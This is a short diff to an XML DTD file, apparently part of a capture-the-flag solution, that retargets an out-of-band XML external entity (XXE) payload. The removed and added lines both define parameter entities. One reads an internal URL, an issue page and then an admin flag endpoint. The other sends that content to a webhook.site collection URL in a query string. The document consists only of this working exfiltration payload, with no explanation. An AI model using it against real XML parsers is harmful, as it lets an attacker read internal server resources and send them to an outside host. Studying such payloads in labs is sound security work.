@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://localhost:8080/issue/1">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/a80828a8-9862-4b25-af31-bd3a5450bcdb/?x=%file;'>">
+<!ENTITY % file SYSTEM "http://admin:3017/flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/aaf29fa8-2a3e-4194-a085-5359b0ad8a32/?x=%file;'>">
 %eval;
 %exfiltrate;
